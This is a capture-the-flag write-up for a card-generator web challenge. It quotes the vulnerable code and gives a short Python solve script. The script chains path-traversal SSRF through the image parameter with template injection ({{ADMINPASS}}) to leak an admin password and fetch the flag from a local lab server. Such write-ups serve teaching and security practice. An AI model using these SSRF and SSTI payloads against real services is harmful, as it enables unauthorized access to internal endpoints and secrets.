# Overview
- We firstly see that to get the flag we need to make an internal get request to `/admin-card` and provide the `adminpass` as a query parameter.
- Now the only endpoint available to us is `/cards` which accepts an `image` parameter, then *crafts* a card with that image and a random wish message.
- We analyze the `make_card` function:
```py
def make_card(img: str, wish= ''):
    if not img or not img.endswith('.png'):
        return None
    if any([c in wish for c in '<>%_&"\\()']): # these may crash something
        return None
    
    if not wish:
        wish = get_wish()
    
    img_b64 = img_from_url(f'http://127.0.0.1:1337/static/images/{img}')
    if not img_b64:
        return None
    card_html = generate_card_html(img_b64,wish)
    as_pic = imgkit.from_string(card_html, False, options= {'format': 'png', 'quiet': '', 'crop-h': '1000', 'crop-w': '800'})
    return as_pic
```
- It checks if the image ends with `.png` and if the wish message contains any of the characters `<>%_&"\\()`, if so it returns `None`.
- It then fetches the image from the server and generates a card with the image and the wish message.
- Also, the `generate_card_html` function seems to `render_template_string` with the `wish` value.

# Solution
- SSRF to hit the `/custom-cards` endpoint and SSTI to get the `ADMINPASS` value.
- Then SSRF to hit the `/admin-card` endpoint with the `adminpass` value.

```python
from requests import post
url='http://127.0.0.1:1337'

r=post(f'{url}/cards', data= {'image': '../../custom-cards?image=green.png&wish={{ADMINPASS}}&dummy=.png'}).content
open('card.png', 'wb').write(r)

# PASS = input('Pass>')
PASS = 'GOD_INTERN!'

r = post(f'{url}/cards', data= {'image': f'../../admin-card?pass={PASS}&dummy=.png'}).content

open('flag.png', 'wb').write(r)
```